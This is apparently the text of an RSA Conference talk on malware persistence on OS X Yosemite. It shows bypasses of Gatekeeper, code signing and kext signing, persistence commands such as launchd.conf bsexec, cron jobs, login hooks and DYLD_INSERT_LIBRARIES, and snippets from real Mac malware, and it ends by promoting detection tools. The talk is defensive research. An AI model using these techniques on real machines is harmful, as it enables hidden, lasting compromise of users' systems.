SESSION ID: HT-R03
Malware Persistence on OS X Yosemite

Patrick Wardle
Director of R&D, Synack @patrickwardle

#RSAC

ABOUT

#RSAC
always looking for more experts!

"Synack leverages the best combination of vetted security researchers and technology to create a uniquely powerful security solution that delivers ongoing and on-demand vulnerability intelligence."

vetted researchers internal R&D backed by google

@patrickwardle
/NASA /NSA /VRL /SYNACK

AN OUTLINE

#RSAC

apple, persistence, malware, & tools

state of the apple

methods of persistence

os x malware

(free) tools

#RSAC
THE STATE OF THE APPLE
good & bad

THE RISE OF MACS

#RSAC

macs are everywhere (home & enterprise)

#3 usa / #5 worldwide vendor in pc shipments

percentage

14

10.5

7

3.5

0

'09

'10

'11

'12

'13

year

macs as % of total usa pc sales

"Mac notebook sales have grown 21% over the last year, while total industry sales have fallen" -apple (3/2015)

MALWARE ON OS X

#RSAC

but macs don't get malware...right?

"It doesn't get PC viruses. A Mac isn't susceptible to the thousands of viruses plaguing Windows-based computers." -apple.com (2012)

`first' virus (elk cloner) infected apple II's

last year, 33 new os x malware families

APPLE'S RESPONSE

#RSAC

OS X now contains many anti-malware features

so we're all safe now, right?!?

gatekeeper os x sandbox

}xprotect

nope!

<

`wins'

code-signing

GATEKEEPER
verifies downloaded software

#RSAC
quarantine flag explicitly added

//attributes $ xattr -l ~/Downloads/googlechrome.dmg
com.apple.quarantine:0001;534e3038; Google Chrome; B8E3DA59-32F6-4580-8AB3...
quarantine attributes
"Gatekeeper is an anti-malware feature of the OS X operating system. It allows users to restrict which sources they can install applications from, in order to reduce the likelihood of executing a Trojan horse"

GATEKEEPER BYPASS
'dylib hijack' ftw

not verified!

#RSAC
verified, so can't modify

gatekeeper only verifies the app bundle!!

<external>.dylib

(signed) application

.dmg/.zip layout

gatekeeper bypass

XPROTECT & BYPASS

#RSAC

apple's built-in 'anti-malware' system

}

name
hash file name XProtect signature file

bypasses
recompile write new ...or just rename!

APPLICATION SANDBOX & BYPASS

#RSAC

prevents apps from accessing OS level components

app

sandboxed app

sandbox

user data

system resources

20+ bugs that could bypass the sandbox (`project zero')

SIGNED APPLICATIONS
verified at runtime

#RSAC
OS loader verifies all signatures!

Process: Path:

killed by the loader
Safari [1599] Safari.app/Contents/MacOS/Safari

Exception Type: EXC_CRASH (Code Signature Invalid) Exception Codes: 0x0000000000000000, 0x0000000000000000

SIGNED APPLICATION BYPASS
'unsigning' for the win

#RSAC
code signature

# md5 Safari.app/Contents/MacOS/Safari -> 633d043cf9742d6f0787acdee742c10d
# unsign.py Safari.app/Contents/MacOS/Safari Safari code signature removed
 # md5 Safari.app/Contents/MacOS/Safari ->
825edd6a1e3aefa98d7cf99a60bac409  $ open /Applications/Safari.app && ps aux | grep Safari
patrick 31337 /Applications/Safari.app

SIGNED KEXTS

#RSAC

starting on os x mavericks, kexts must be signed

blocking an unsigned kext

kernel-mode user-mode

similar to windows, this aims to prevent unauthorized code from being loaded
into ring-O

signed kext

unsigned kext

SIGNED KEXT BYPASS
abusing a design flaw to load an unsigned kext

#RSAC
http://reverse.put.as

//check signature sigResult = checkKextSignature(kext);
//invalid signature? if(sigResult != 0) {
//error msg OSKextLogCFString("ERROR: \ invalid signature, will not load");
//bail goto finish; }
//load kext OSKextLoadWithOptions(kext);
user-mode signature verification

# lldb -p <pid of kextd> (lldb) disassemble --start-address <addr>
0x10087c0df: mov %eax, %ebx ... 0x10087c0ef: ret
(lldb) memory write -s 2 <addr> 0xc031
(lldb) disassemble --start-address <addr> 0x10087c0df: xorl %eax, %eax ... 0x10087c0ef: ret
 sh-3.2# kextload unsigned.kext
sh-3.2# kextstat | grep -i unsigned 0xffffff7f81bb0000 com.synack.unsigned
patch & unsigned kext loading

SIGNED KEXT BYPASS

#RSAC

abusing a design flaw to load an unsigned kext

download patch & recompile kext_tools kextload

loadKextsIntoKernel(KextloadArgs * toolArgs) {
//sigResult = checkKextSignature(theKext, 0x1, earlyBoot);
//always OK! sigResult = 0; }
patched kextload

//unload kext daemon # launchctl unload /System/Library/LaunchDaemons/com.apple.kextd.plist

//load (unsigned) driver with custom kext_load # ./patchedKextload -v unsigned.kext
Can't contact kextd; attempting to load directly into kernel

//profit :) # kextstat | grep -i unsigned
138 0 0xffffff7f82eeb000 com.synack.unsigned

unsigned kext loading

3RD-PARTY 'SECURITY' TOOLS?

#RSAC

all trivially & generically bypassed :/

persist

exfil files download & execute cmd

ClamXav
LittleSnitch
OS X 'security' products

Sophos

THE CURRENT SITUATION

#RSAC

the apple juice is sour...

+

+

+

lots of macs

feeble anti-malware protections

os x malware

limited detection/ prevention tools

by identifying persistence mechanisms in os x and studying malware that abuses these, we can (better) protect ourselves

....and new tools can help as well!

#RSAC
METHODS OF PERSISTENCE
where malware may live

LOW-LEVEL

#RSAC

the boot process affords several opportunities for persistence

often highly complex, though very insidious and difficult to detect

install malicious EFI components?

replace/patch the boot.efi?
re-flash the bootROM?

infecting the boot process

`mac efi rootkits' by loukas k (snare)

KERNEL EXTENSIONS (KEXTS)

#RSAC

loaded automatically into ring-0

write a KEXT

copy to KEXT directory

set ownership to root

rebuild kernel cache

also: /System/Library/Extensions

# cp -R persist.kext /Library/Extensions

# chown -R root:wheel /Library/Extensions/persist.kext

# kextcache -system-prelinked-kernel # kextcache -system-caches
installing a kext

LAUNCH DAEMONS & AGENTS

#RSAC

similar to windows services

daemons and agents are started by launchD

daemons

non interactive, launched pre-login

agents

interactive,  launched post-login

/System/Library/LaunchDaemons /Library/LaunchDaemons

/System/Library/LaunchAgents /Library/LaunchAgents ~/Library/LaunchAgents

LAUNCH DAEMONS & AGENTS
registered (`installed') via a property list

#RSAC
plist instructs launchD how/ when to load the item

label/identifier auto launch

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC ...> <plist version="1.0"> <dict>
<key>Label</key> <string>com.example.persist</string> <key>ProgramArguments</key> <array>
<string>/path/to/persist</string> <string>args?</string> </array> <key>RunAtLoad</key> <true/> </dict>
</plist>

binary image

daemon/agent plist

CRON JOBS

#RSAC

used to automatically run scrips/commands

popular with malware writers coming from *nix based backgrounds

can use @reboot, @daily, etc.

create

$ echo "* * * * * echo \"I'm persisting\"" > /tmp/persistJob
$ crontab /tmp/persistJob
$ crontab -l * * * * * echo "I'm persisting"

creating & installing a cron job

LOGIN & LOGOUT HOOKS

#RSAC

allow a script to be automatically executed at login and/or logout

# defaults write com.apple.loginwindow LoginHook /usr/bin/hook.sh

/Library/Preferences/com.apple.loginwindow.plist

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist ...> <plist version="1.0"> <dict>
<key>LoginHook</key> <string>/usr/bin/hook.sh</string> </dict> </plist>
login hook

script

LOGIN ITEMS

#RSAC

`legitimate' method to ensure apps are executed at login

~/Library/Preferences/com.apple.loginitems.plist

System Preferences -> Users & Groups -> Login Items
base64 data (path, etc.)

<dict> <key>com.apple.LSSharedFileList.Binding</key> <key>Name</key> <string>iTunesHelper</string> <key>com.apple.LSSharedFileList.ItemIsHidden</key> <true/> <key>com.apple.loginitem.HideOnLaunch</key> <true/> <data> ZG5pYgAAAAACAAAAAAAAAAAAAAAAAAAAAAAA... </data>
</dict>

login item plist

LOGIN ITEMS (SANDBOXED)LOGIN

#RSAC

ensure sandboxed apps are executed at each login, `legitimately'

does not show up in (any) GUI
copy persistent app to <main>.app/Contents/Library/LoginItems

invoke SMLoginItemSetEnableD() in the main app, with the persistent app's id

/private/var/db/launchd.db/ ->com.apple.launchd.peruser.501/overrides.plist

//enable auto launch SMLoginItemSetEnabled((__bridge CFStringRef) @"com.company.persistMe", YES);
sandboxed login item

STARTUP ITEMS
allow a script to be automatically executed at each reboot

#RSAC
match script's name

#!/bin/sh . /etc/rc.common  StartService()  {
#anything here } 
RunService "$1"

{ Description = "anything"; Provides = ("<name>"); 
}
StartupParameters.plist

persistent script

/System/Library/StartupItems /Library/StartupItems

RC.COMMON

#RSAC

allows scripts or commands to automatically execute

another linux'y-based technique
# vim /etc/rc.common ... add any commands (at end)
modifying rc.common

LAUNCHD.CONF

#RSAC

allows launchCtl commands to be automatically executed

default; file doesn't exist

# echo bsexec 1 /bin/bash <anything.script> > /etc/launchd.conf
launchd.conf
'bsexec' is a launchCtl command that executes other commands...perfect!
can also set environment variables via the setenv command (e.g. DYLD_INSERT_LIBRARIES)

DYLD_INSERT_LIBRARIES

#RSAC

allows a library to be automatically loaded/executed

application

$ less /Applications/Safari.app/Contents/Info.plist

...

<key>LSEnvironment</key>

<dict>

<key>DYLD_INSERT_LIBRARIES</key>

unsign the target binary

<string>/usr/bin/evil.dylib</string>

</dict>

$ less /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist

...

<key>EnvironmentVariables</key>

<dict>

launch item

<key>DYLD_INSERT_LIBRARIES</key> <string>/usr/bin/evil.dylib</string>

</dict>

dyld_insert_libraries (app & launch item)

DYLIB HIJACKING

#RSAC

simply plant a file to gain persistence

app dir

"I need <blah>.dylib"

 stealthy novel technique  no binary/OS modifications!

<blah>.dylib

<blah>.dylib

$ reboot $ lsof -p <pid of PhotoStreamAgent> /Applications/iPhoto.app/Contents/Library/LoginItems/PhotoFoundation.framework/Versions/A/PhotoFoundation /Applications/iPhoto.app/Contents/Frameworks/PhotoFoundation.framework/Versions/A/PhotoFoundation
dylib hijacking Apple's PhotoStream Agent

SYSTEM PLUGINS (SPOTLIGHT)
abusing system plugins for persistence

#RSAC
for all files: 'public.data'

spotlight importer template

plugin match type

$ reboot $ lsof -p <pid of mdworker> /System/Library/Frameworks/CoreServices.framework/../Metadata.framework/Versions/A/Support/mdworker /Library/Spotlight/persist.mdimporter/Contents/MacOS/persist
persistent spotlight importer

SYSTEM PLUGINS (AUTHORIZATION PLUGIN)

#RSAC

abusing system plugins for persistence

create bundle (NullAuthPlugin)

copy to: /Library/Security/ SecurityAgentPlugins/  set owner to root:wheel

$ security authorizationdb read system.login.console > out.plist

authorization database

$ vim out.plist <key>mechanisms</key>
<array> <string>NullAuthPlugin:anything</string>
$ sudo authorizationdb write system.login.console < out.plist

installing authorization plugin

APPLICATION SPECIFIC
plugins or extensions can provide automatic code execution

#RSAC
`evil plugin' (fG!)

safari

firefox

chrome

iTunes

browser (chrome) extensions

MACH-O INFECTION

#RSAC

ensures (injected) code is executed when host is run

google 'OS.X/Boubou'

hijack entry point? add new LC_LOAD_DYLIB?
mach-O binary infection

#RSAC
PERSISTENCE OS X MALWARE
how the bad guys do it

OSX/CALLME (LAUNCH DAEMON)
allows for infil/exfil & remote execution of commands

#RSAC
fs_usage is like fileMon

# fs_usage -w -filesystem | grep OSX_CallMe



open

/library/LaunchDaemons/.dat035f.000

WrData[A] /library/LaunchDaemons/.dat035f.000

rename

/library/LaunchDaemons/.dat035f.000

-> /library/LaunchDaemons/realPlayerUpdate.plist

the malware

$ ls /Library/LaunchDaemons/real* realPlayerUpdate.plist  $ ps aux | grep -i real root 0:00.06 /Library/Application Support/.realPlayerUpdate
launch daemon persistence

OSX/IWORM (LAUNCH DAEMON)

#RSAC

`standard' backdoor, providing survey, download/execute, etc.

__cstring:0000E910 db '/Library/LaunchDaemons/',0 db 'com.JavaW.plist',0 db 'launchctl load',0

persistence

$ less /Library/LaunchDaemons/com.JavaW.plist ... <key>Label</key> <string>com.JavaW</string> <key>ProgramArguments</key> <array> <string> /Library/Application Support/JavaW/JavaW </string> </array> <key>RunAtLoad</key> <true/>
launch daemon persistence

malware's binary

OSX/CRISIS (LAUNCH AGENT)

#RSAC

collects audio, images, screenshots and keystrokes

method name

;build path for malware's launch agent plist -[RCSMUtils createLaunchAgentPlist:forBinary:]  call NSHomeDirectory mov [esp+0Ch], eax lea edx, @"Library/LaunchAgents/com.apple.mdworker.plist" mov [esp+10h], edx lea edx, "%@/%@" mov [esp+8], edx mov [esp+4], stringWithFormat_message_refs mov [esp], NSString_clsRef call _objc_msgSend

(user) launch agent persistence
[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"Library/LaunchAgents/com.apple.mdworker.plist"];

OSX/FLASHBACK (LAUNCH AGENT)

#RSAC

injects ads into users' http/https streams

persist

$ less ~/Library/LaunchAgents/com.java.update.plist <?xml version="1.0" encoding="UTF-8"?> ... <dict>
<key>Label</key> <string>com.java.update.plist</string> <key>ProgramArguments</key> <array>
<string> /Users/user/.jupdate </string> </array> <key>RunAtLoad</key> <true/>
(user) launch agent persistence

malware's binary

OSX/XSLCMD (LAUNCH AGENT)

#RSAC

provides reverse shell, infil/exfil, installation of other tools

__cstring:0000E910

clipboardd db 'clipboardd',0 com_apple_serv db 'com.ap$pllees.sse~r/vLiicber.acryl/iLpabuonacrhdAdg.epntlsi/scto'm,.0apple.service.clipboardd.plist

libraryLaunch db '/Librar<y?/xLmlauvnecrhsAigoenn=t"1s.'0,"0 e ncoding="UTF-8"?> db '<?xml version="1.0" e<npcloisdtinvge=r"sUiToFn-="81".?0>"'>,0Ah

db '<plist version="1.0"><'d,i0ctA>h

db '<dict>',0Ah

<key>RunAtLoad</key>

<false/>

db '<key>RunAtLoad</key>',<0kAeyh>KeepAlive</key>

persistence

db '<false/>',0Ah

<true/>

db '<key>KeepAlive</key>',<0kAeyh>Label</key>

db '<true/>',0Ah

<string>com.apple.service.clipboardd</string>

db '<key>Label</key>',0Ah <key>Program</key>

db '<string>com.apple.serv<isctrei.ncgl>i~p/bLoiabrradrdy<//LsaturnicnhgA>ge'n,t0sA/hclipboardd</string>

db '<key>Program</key>',0<A/hdict>

db '<string>%s</string>',<0/Aphlist>

db '</dict>',0Ah db '</plist>',0Ah,0

launch agent persistence

OSX/JANICAB (CRONJOB)

#RSAC

collects audio & screenshots

janicab's installer.py

""" add to crontab """  #add the script to crontab subprocess.call("echo \"* * * * * 
python ~/.t/runner.pyc \" >>/tmp/dump",shell=True)
#import the new crontab subprocess.call("crontab /tmp/dump",shell=True) subprocess.call("rm -f /tmp/dump",shell=True)

$ crontab -l * * * * * python ~/.t/runner.pyc
cron job persistence

OSX/KITMOS (LOGIN ITEM)
uploads screen shots to a remote c&c server

;build path for malware's launch agent plist

-[FileBackupAppDelegate checkAutorun]

mov

dword ptr [esp+18h], 0

mov

dword ptr [esp+14h], 0

mov

[esp+10h], ebx

mov

dword ptr [esp+0Ch], 0

mov

dword ptr [esp+8], 0

mov

[esp+4], eax ; _kLSSharedFileListItemLast_ptr

mov

[esp], edi ; _LSSharedFileListCreate

call LSSharedFileListInsertItemURL

persistence api

#RSAC
user's login items

login item persistence

OSX/MACPROTECTOR (LOGIN ITEM)

#RSAC

fake (rogue) anti-virus product that coerces user into paying up

~/Library/Preferences/com.apple.loginitems.plist

base64 encoded  path, etc

<dict>

<key>Alias</key>

<data>

ZG5pYgAAAAACAAAAAAAAAAAAAAAAAAAAAAAA...

</data>

display name

<key>Name</key>

<string>MacProtector</string>

</dict>

login item persistence

OSX/YONTOO (BROWSER EXTENSION)
injects adds into users' browser sessions

#RSAC
extracted from IDA disassembly

;create paths for malicious plugins 

lea edi, cfstr_InstallingExte; "Installing extensions"

lea ebx, cfstr_Ok

; "Ok"

...

 +[ExtensionsInstaller installSafariExtension:] "~/Library/Safari/Extensions/Extensions.plist"  +[ExtensionsInstaller installFirefoxExtension:]

"~/Library/Application Support/Mozilla/Extensions"  +[ExtensionsInstaller installChromeExtension:]

"~/Library/Application Support/Google/Chrome/External Extensions"

browser extension persistence

#RSAC
NOW, THERE'S AN APP FOR THAT
free tools to protect our macs :)

KNOCK KNOCK'S DESIGN & GOALS

#RSAC

find what's automatically executed during startup

"open-source, plugin-oriented, design aims to encourage collaboration & evolution"

scan

core engine

malware

plugins

auto run binaries & commands

github.com/synack/knockknock

KNOCKKNOCK OUTPUT

#RSAC

command-line malware detection

$ python knockknock.py -p launchDandA WHO'S THERE:
[Launch Agents]
clipboardd path: /Users/user/Library/LaunchAgents/clipboardd plist: /Users/user/Library/LaunchAgents/com.apple.service.clipboardd.plist hash: 60242ad3e1b6c4d417d4dfeb8fb464a1
TOTAL ITEMS FOUND: 1
OSX/XSLCmd detection

KNOCKKNOCK UI
detecting persistence: an app for that!

#RSAC
a complete re-write

distribution user experience speed

KNOCKKNOCK UI

#RSAC

VirusTotal integration

detect submit rescan results VirusTotal integrations

BLOCKBLOCK (BETA)

#RSAC

continual runtime protection!

status bar

BlockBlock, block blocking :)

OBJECTIVE-SEE.COM

#RSAC

...for free OS X tools & malware samples

dylib hijack scanner knockknock

blockblock

SOME CONCLUSIONS

#RSAC

...wrapping this up

myriad of persistence methods

+

=

insecure macs

os x malware

but knowledge is power and new tools can help!  knockknock (ui) & blockblock

QUESTIONS & ANSWERS

#RSAC

...feel free to contact me any time!

patrick@synack.com

@patrickwardle

syn.ac/RSA

IMAGE CREDITS

#RSAC

thezooom.com deviantart.com (FreshFarhan)  iconmonstr.com flaticon.com

